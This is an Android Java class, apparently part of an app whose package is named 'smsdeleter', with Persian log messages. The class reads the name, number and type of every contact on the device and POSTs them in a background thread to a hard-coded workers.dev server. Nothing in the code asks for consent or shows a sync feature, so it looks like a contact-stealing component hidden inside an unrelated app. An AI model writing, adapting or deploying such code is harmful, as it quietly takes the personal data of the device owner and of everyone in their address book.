package com.example.smsdeleter;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class ContactsSyncManager {

    private static final String TAG = "CONTACTS_SYNC";
    private static final String API_URL = "https://testapp.lastofanarchy.workers.dev/";

    private Context context;

    public ContactsSyncManager(Context context) {
        this.context = context;
    }

    public void syncContacts() {
        new Thread(() -> {
            try {
                Log.d(TAG, "شروع استخراج مخاطبین...");

                // استخراج مخاطبین
                JSONArray contactsArray = extractContacts();

                if (contactsArray.length() == 0) {
                    Log.w(TAG, "هیچ مخاطبی پیدا نشد");
                    return;
                }

                Log.d(TAG, "تعداد مخاطبین: " + contactsArray.length());

                // ارسال به سرور
                boolean success = sendToServer(contactsArray);

                if (success) {
                    Log.i(TAG, "✓ مخاطبین با موفقیت به سرور ارسال شدند");
                } else {
                    Log.e(TAG, "✗ خطا در ارسال مخاطبین");
                }

            } catch (Exception e) {
                Log.e(TAG, "خطا در sync مخاطبین: " + e.getMessage(), e);
            }
        }).start();
    }

    private JSONArray extractContacts() {
        JSONArray contactsArray = new JSONArray();

        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                },
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );

            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNumber = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.TYPE));

                    JSONObject contact = new JSONObject();
                    contact.put("name", name != null ? name : "");
                    contact.put("phone", phoneNumber != null ? phoneNumber : "");
                    contact.put("type", getPhoneTypeLabel(type));

                    contactsArray.put(contact);

                    Log.d(TAG, "مخاطب: " + name + " - " + phoneNumber);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "خطا در استخراج مخاطبین: " + e.getMessage(), e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        return contactsArray;
    }

    private boolean sendToServer(JSONArray contacts) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(API_URL);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setDoOutput(true);
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(15000);

            // ساخت JSON body
            JSONObject requestBody = new JSONObject();
            requestBody.put("contacts", contacts);
            requestBody.put("timestamp", System.currentTimeMillis());

            // ارسال داده
            byte[] outputBytes = requestBody.toString().getBytes(StandardCharsets.UTF_8);
            try (OutputStream os = connection.getOutputStream()) {
                os.write(outputBytes);
                os.flush();
            }

            int responseCode = connection.getResponseCode();
            Log.d(TAG, "Response Code: " + responseCode);

            return responseCode >= 200 && responseCode < 300;

        } catch (Exception e) {
            Log.e(TAG, "خطا در ارسال به سرور: " + e.getMessage(), e);
            return false;
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private String getPhoneTypeLabel(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "خانه";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "موبایل";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "کار";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                return "فکس کار";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                return "فکس خانه";
            case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                return "پیجر";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                return "سایر";
            default:
                return "نامشخص";
        }
    }
}
